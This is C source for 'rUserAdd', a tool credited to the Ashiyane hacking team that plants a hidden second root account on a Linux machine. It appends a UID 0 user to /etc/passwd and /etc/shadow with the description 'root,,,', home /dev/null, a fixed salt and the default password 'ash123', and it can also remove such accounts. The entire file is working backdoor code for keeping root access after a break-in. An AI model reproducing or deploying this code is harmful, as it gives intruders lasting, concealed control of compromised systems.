/*
 * 
 *  rUserAdd - A program to add root user to GNU/Linux OSs
 * 
 * 	Thanks to Pr0grammer @ Ashiyane for his idea ;)
 * 
 *  Copyright (C) 2013  Hamid Zamani (aka HAMIDx9) - Pr0grammer
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 * 
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 * 
 * 
 */
 
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <time.h>
#include <getopt.h>
#include <sys/stat.h>
//#include <errno.h>


//prototypes
static int pwd_check(const char *);
static void del_user(const char *);
static void pwd_insert(char *, char *);


/*
 * 
 * name: usage
 * 
 */
static void usage(const char *program)
{
	system("clear");
	fprintf(stderr, "#########################################################################\n");
	fprintf(stderr, "#                                                                       #\n");
	fprintf(stderr, "#                  Ashiyane Digital Security Team                       #\n");
	fprintf(stderr, "#                        Ashiyane ROOT User add                         #\n");
	fprintf(stderr, "#                            rUserAdd v0.2                              #\n");
	fprintf(stderr, "#                 Thanks to Pr0grammer for his idea                     #\n");
	fprintf(stderr, "#                             By  HAMIDx9                               #\n");
	fprintf(stderr, "#                                                                       #\n");
	fprintf(stderr, "#########################################################################\n\n");
	fprintf(stderr, " Usage[0]: %s -c user_name\t\t// check existance of a username\n",program);
	fprintf(stderr, " Usage[1]: %s -a user_name -p password\t// add a user with an exact password\n",program);
	fprintf(stderr, " Usage[2]: %s -a user_name\t\t// add a user with default pass : ash123\n",program);
	fprintf(stderr, " Usage[3]: %s -d user_name\t	\t// delete a user\n\n",program);
	fflush(stderr);
	exit(1);
}

/*
 * 
 * name: pwd_check
 * @name is the username
 * @return is 0 for existing or 1 for existance
 * 
 */
static int pwd_check(const char *name)
{
	struct passwd *passwd = NULL;
	
	passwd = getpwnam(name); // checking the username existance by glibc function
	
	if (passwd == NULL)
	{
		fprintf(stderr, "%s: User does not exist.\n",name);
		//exit(1);
		return 1;
	}
	fprintf(stderr, "%s: User exists.\n",name);
	return 0;
}

/*
 * name: pwd_insert
 * @name is the username
 * @password is the password
 * 
 */
static void pwd_insert(char *name, char *password)
{
	struct passwd pw;
	struct stat sb;
	char *crypt_pw;
	crypt_pw = crypt(password, "$6$ashiyane"); // calculating the encrypted hash according to SHA-512 and salt 'ashiyane'
	
	int rv = pwd_check(name);
	if (!rv)
		exit(EXIT_FAILURE); // user exists so we must leave this program ;)
	
	FILE *file;
	file = fopen("/etc/passwd","a");
	fseek(file, 0, SEEK_END);
	
	pw.pw_name = name;
	pw.pw_passwd = crypt_pw;
	pw.pw_uid = 0;
	pw.pw_gid = 0;
	pw.pw_gecos = "root,,,";
	pw.pw_dir = "/dev/null";
	pw.pw_shell = "/bin/sh";
	
	if ((stat("/etc/shadow",&sb)) == 0)   // if we have /etc/shadow so we should use 'x' for password in /etc/passwd and go on ... 
	{
		
		pw.pw_passwd = "x";
		
		if (putpwent(&pw,file) == -1)
		{
			fprintf(stderr, "Filed to add user to /etc/passwd");
			exit(1);
		}
		fclose(file);
		
		file = fopen("/etc/shadow","a");
		fseek(file, 0, SEEK_END);
		
		fprintf(file, "%s:%s:%ld:%d:%d:%d:::\n",
												pw.pw_name,                             /* username */
												crypt_pw,
												time(NULL) / 86400,             /* sp.sp_lstchg */
												0,                                              /* sp->sp_min */
												99999,                                  /* sp->sp_max */
												7);     
		
		fclose(file);
			
	} else {
	
		if (putpwent(&pw,file) == -1) 		// updateing /etc/passwd by glibc functions
		{
			fprintf(stderr, "Filed to add user to /etc/passwd");
			exit(1);
		}
		fclose(file);
	
	}
	printf("User '%s' with password '%s' added successfully\n", name, password);
}

/*
 * 
 * name: del_user
 * @name is the username
 * 
 */
static void del_user(const char *name)
{
	FILE *file1,*file2;
	char *line;
	const char *file_name = "/tmp/rUserAdd-tmp";   // my tmp file for updating /etc/passwd while deleting a user
	size_t len = 0;
	ssize_t read;	
	struct stat sb;

	// Starting for /etc/passwd
	
	if ( (file1 = fopen(file_name,"w")) == NULL) 
	{
		fprintf(stderr,"Failed to create temp file\n");
		exit(EXIT_FAILURE);
	}

	if ( (file2 = fopen("/etc/passwd","r") ) == NULL)
	{
		fprintf(stderr,"Failed to open to /etc/passwd\n");
		exit(EXIT_FAILURE);
	}
	
	while ((read = getline(&line, &len, file2)) != -1) {
		if ( (strncmp(line, name, strlen(name)) != 0 ) || (line[strlen(name)] != ':'))  // we must not delete users that first of their name are the same !
		{
			if ( (fprintf(file1, "%s",line)) < 0)
			{
				fprintf(stderr,"Failed to write to temp file\n");
				exit(EXIT_FAILURE);
			}
		}
    }
	
	fclose(file1);
	fclose(file2);
	
	if ( (file1 = fopen(file_name,"r")) == NULL) 
	{
		fprintf(stderr,"Failed to open temp file\n");
		exit(EXIT_FAILURE);
	}

	if ( (file2 = fopen("/etc/passwd","w") ) == NULL)
	{
		fprintf(stderr,"Failed to open to /etc/passwd\n");
		exit(EXIT_FAILURE);
	}
	
	while ((read = getline(&line, &len, file1)) != -1) {
	
			fprintf(file2,"%s",line);
		
	}
	
	fclose(file1);
	fclose(file2);
	
	////   Starting for /etc/shadow if it is available
	if ((stat("/etc/shadow",&sb)) == 0)
	{
		if ( (file1 = fopen(file_name,"w")) == NULL) 
		{
			fprintf(stderr,"Failed to create temp file\n");
			exit(EXIT_FAILURE);
		}

		if ( (file2 = fopen("/etc/shadow","r") ) == NULL)
		{
			fprintf(stderr,"Failed to open to /etc/shadow\n");
			exit(EXIT_FAILURE);
		}
		
		while ((read = getline(&line, &len, file2)) != -1) {
			if ( (strncmp(line, name, strlen(name)) != 0 ) || (line[strlen(name)] != ':'))
			{
				if ( (fprintf(file1, "%s",line)) < 0)
				{
					fprintf(stderr,"Failed to write to temp file\n");
					exit(EXIT_FAILURE);
				}
			}
		}
		
		fclose(file1);
		fclose(file2);
		
		if ( (file1 = fopen(file_name,"r")) == NULL) 
		{
			fprintf(stderr,"Failed to open temp file\n");
			exit(EXIT_FAILURE);
		}

		if ( (file2 = fopen("/etc/shadow","w") ) == NULL)
		{
			fprintf(stderr,"Failed to open to /etc/shadow\n");
			exit(EXIT_FAILURE);
		}
		
		while ((read = getline(&line, &len, file1)) != -1) {
		
				fprintf(file2,"%s",line);
			
		}
		
		fclose(file1);
		fclose(file2);
	}
	free(line);
	
	printf("User '%s' deleted successfully\n",name);
	remove(file_name);
		
}

int main(int argc, char **argv)
{
	
	char *user_name;
	char *password;
	int opt,pflag=0;
	
	if (getuid() != 0 && getgid() != 0)
	{
		fprintf(stderr,"You must run rUserAdd as root, Exiting...\n");
		exit(EXIT_FAILURE);
	}

	if (argc < 2)
	{
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}
	
	while ((opt = getopt(argc,argv,"c:a:vp:d:")) != -1 )
	{
		switch(opt) 
		{
			case 'c':
				user_name = optarg;
				pwd_check(user_name);
				return 0;
			case 'd':
				user_name = optarg;
				del_user(user_name);
				return 0;
				//break;
			case 'a':
				user_name = optarg;
				break;
			case 'p':
				password = optarg;
				pflag = 1;
				break;
			case 'v':
			default:
				usage(argv[0]);
				break;
				
				
		}
	}
	
	if (!pflag)
		password = "ash123";   // default password
	
	pwd_insert(user_name, password);	// let me insert it ;)
	
	return 0;

}
